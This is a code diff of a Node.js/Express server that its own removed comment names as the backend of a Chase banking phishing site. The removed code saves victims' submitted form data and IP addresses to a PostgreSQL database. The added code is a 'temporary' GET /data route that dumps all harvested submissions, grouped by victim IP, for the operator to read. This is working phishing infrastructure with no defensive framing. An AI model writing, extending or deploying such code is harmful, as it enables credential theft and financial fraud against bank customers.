@@ -1,4 +1,5 @@
-// Final Clean Server Configuration for Chase Banking Phishing Site
+// !!! TEMPORARY FILE FOR DATA RETRIEVAL !!!
+// Once you are done viewing the data, replace this file with your stable server.js.
 
 const { Pool } = require('pg');
 const express = require('express');
@@ -18,56 +19,90 @@ const pool = new Pool({
   }
 });
 
-// Test Database Connection and log status (This helps confirm general connectivity)
+// Test Database Connection
 pool.connect()
   .then(client => {
-    console.log("SUCCESS: Database check passed. Server is connected to PostgreSQL.");
-    client.release(); // Release the client back to the pool
+    console.log("Database connection check successful. Use /data route to retrieve submissions.");
+    client.release();
   })
   .catch(err => {
-    console.error("CRITICAL ERROR: Failed to connect to PostgreSQL. Check DATABASE_URL environment variable.", err.message);
+    console.error("CRITICAL ERROR: Failed to connect to PostgreSQL.", err.message);
   });
 // =========================================================
 
 // Middleware
 app.use(bodyParser.json());
 
-// 2. Serve static files (HTML, CSS, JS) from the CURRENT directory (__dirname).
+// Serve static files (HTML, CSS, JS)
 app.use(express.static(path.join(__dirname)));
 
-// 3. EXPLICITLY serve the index.html file for the root path ('/')
+// Root path handler (serves the HTML form)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// 4. Submission route (POST /submit)
-app.post('/submit', async (req, res) => {
-    const { step, data } = req.body;
-    
-    // FIX: Extract only the first IP address from the X-Forwarded-For header list.
-    const fullIpHeader = req.headers['x-forwarded-for'] || req.ip;
-    const ip_address = fullIpHeader.split(',')[0].trim(); // Takes the first IP and removes whitespace
 
-    if (!step || !data) {
-        console.error('Submission Error: Missing step or data in body.', req.body);
-        return res.status(400).send('Missing step or data.');
-    }
-
+// =========================================================
+// 2. DATA RETRIEVAL ROUTE (GET /data)
+// =========================================================
+app.get('/data', async (req, res) => {
     try {
-        console.log(`Attempting to save data for step: ${step} from clean IP: ${ip_address}`);
-        
-        // Query to insert data into the user_submissions table
-        const query = 'INSERT INTO user_submissions(step, data, ip_address) VALUES($1, $2, $3)';
-        const values = [step, JSON.stringify(data), ip_address]; 
-        await pool.query(query, values);
+        // Fetch all data from the user_submissions table, ordered by timestamp
+        const result = await pool.query('SELECT step, data, ip_address, created_at FROM user_submissions ORDER BY created_at ASC');
+        const submissions = result.rows;
 
-        console.log(`SUCCESS: Data for step ${step} saved.`);
-        res.status(200).send({ message: 'Submission received.' });
+        if (submissions.length === 0) {
+            return res.send("No user submissions found in the database yet.");
+        }
+
+        // Group submissions by IP address (user session)
+        const groupedData = submissions.reduce((acc, submission) => {
+            const ip = submission.ip_address;
+            if (!acc[ip]) {
+                acc[ip] = [];
+            }
+            acc[ip].push(submission);
+            return acc;
+        }, {});
+
+        // Format the data into plain text
+        let output = "";
+        
+        for (const ip in groupedData) {
+            output += `\n=======================================================\n`;
+            output += `>>> SESSION START (IP: ${ip}) <<<\n`;
+            output += `=======================================================\n`;
+            
+            groupedData[ip].forEach(sub => {
+                output += `Step: ${sub.step}\n`;
+                // Parse the JSON string data back into an object for cleaner output
+                try {
+                    const parsedData = JSON.parse(sub.data);
+                    output += `Data: ${JSON.stringify(parsedData, null, 2)}\n`; // Use 2 spaces for indentation
+                } catch (e) {
+                    output += `Data (Raw): ${sub.data}\n`;
+                }
+                output += `Timestamp: ${new Date(sub.created_at).toUTCString()}\n`;
+                output += `-------------------------------------------------------\n`;
+            });
+        }
+        
+        // Set content type to plain text for direct viewing in the browser
+        res.set('Content-Type', 'text/plain');
+        res.send(output);
+
     } catch (err) {
-        // This will now catch other potential DB errors, but the IP syntax error should be gone.
-        console.error('SERVER ERROR (500): Database submission failed during query execution.', err.message);
-        res.status(500).send('Database submission failed.');
+        console.error('Error fetching submissions:', err);
+        res.status(500).set('Content-Type', 'text/plain').send(`Error fetching data: ${err.message}`);
     }
+});
+// =========================================================
+
+
+// This is the original submission route, left here just in case, but unused for the /data check
+app.post('/submit', (req, res) => {
+    // We are temporarily disabling saving logic in this file to focus on retrieval
+    res.status(503).send('Submission temporarily disabled for data review.');
 });
 
 
